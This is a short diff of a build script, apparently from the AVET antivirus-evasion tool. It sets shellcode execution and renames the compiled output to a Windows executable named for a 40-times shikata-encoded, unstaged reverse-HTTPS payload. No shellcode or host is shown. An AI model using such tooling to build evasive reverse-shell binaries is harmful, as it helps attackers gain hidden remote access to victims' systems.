@@ -42,9 +42,9 @@ set_payload_execution_method exec_shellcode
 # don't enable debug output because printing the whole unstaged payload takes a lot of time
 # enable_debug_print
 
-# compile to output.exe file
-$win32_compiler -o output/output.exe source/avet.c
-strip output/output.exe
+# compile to exe file
+$win32_compiler -o output/40xshikata_revhttpsunstaged_win32.exe source/avet.c
+strip output/40xshikata_revhttpsunstaged_win32.exe
 
 # cleanup
 cleanup_techniques
